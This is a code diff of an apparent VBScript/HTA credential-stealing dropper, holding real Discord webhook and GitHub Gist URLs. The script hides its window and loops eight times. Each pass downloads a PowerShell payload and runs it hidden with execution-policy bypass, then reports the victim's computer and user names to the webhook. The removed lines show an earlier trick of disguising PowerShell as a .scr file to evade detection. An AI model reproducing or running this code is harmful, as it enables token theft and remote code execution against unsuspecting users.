@@ -4,30 +4,31 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, PC, USER, GIST_URL
+Dim sh, fso, WH, GIST_URL, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ77wuTTAiFy2SMwMP_kHcPKuKuEw9ERvyGUOHzvRSydAKrqas"
-GIST_URL = "https://gist.github.com/alexproisgamer-dotcom/607e9edddbab4ca67ebbfe0146767f06"
+' ==========================================
+' PUT YOUR WEBHOOK AND GIST URL HERE
+' ==========================================
+WH = "https://discord.com/api/webhooks/1568351976972877926/u0AFPPLPFJOjDwiCVmJRWbe9ZtqUUzEC3rUjzyQfMeib4o3LkZcv82iDRTYBzKkW9I4n"
+GIST_URL = "https://gist.githubusercontent.com/alexproisgamer-dotcom/607e9edddbab4ca67ebbfe0146767f06/raw/5f067aef3a8fd4131a49a2b7a16079f23fa74d62/update.ps1"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' Initial Run
-Call GrabTokens
-
-' Re-run grab chain 8x (every 10 min)
+' --- Re-run grab chain 8x (every 10 min) ---
 Dim runCount
 For runCount = 1 To 8
     Call PostEmbed(":repeat: Re-grab " & runCount & "/8", "PC: " & PC & " | User: " & USER, 3447003)
-    Call GrabTokens
-    If runCount < 8 Then WScript.Sleep 600000 ' Native 10-minute sleep, no cmd.exe
+    Call RunGist
+    If runCount < 8 Then WScript.Sleep 600000 ' Native 10-minute sleep
 Next
 
 window.close()
 
-Sub GrabTokens()
+Sub RunGist()
+    ' Fetch the PS1 from the Gist
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", GIST_URL, False
@@ -37,25 +38,18 @@ Sub GrabTokens()
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
 
-    ' Save the PS1 script
-    Dim psf: psf = TmpFile("u.ps1")
-    WriteFile psf, pc
+    ' Save to temp
+    Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\u.ps1"
+    Dim f: Set f = fso.CreateTextFile(psf, True)
+    f.Write pc
+    f.Close
     
-    ' Copy PowerShell to a temp .scr to bypass behavioral flags
-    Dim psexec : psexec = TmpFile("p.scr")
-    Dim realPs : realPs = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\WindowsPowerShell\v1.0\powershell.exe"
-    fso.CopyFile realPs, psexec, True
-    
-    ' Run the script
-    sh.Run """" & psexec & """ -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File """ & psf & """", 0, True
+    ' Run it silently
+    sh.Run "powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File """ & psf & """", 0, True
     
     ' Cleanup
     fso.DeleteFile psf, True
-    fso.DeleteFile psexec, True
 End Sub
-
-Function TmpFile(name) : TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name : End Function
-Sub WriteFile(path, content) : Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing : End Sub
 
 Sub PostEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
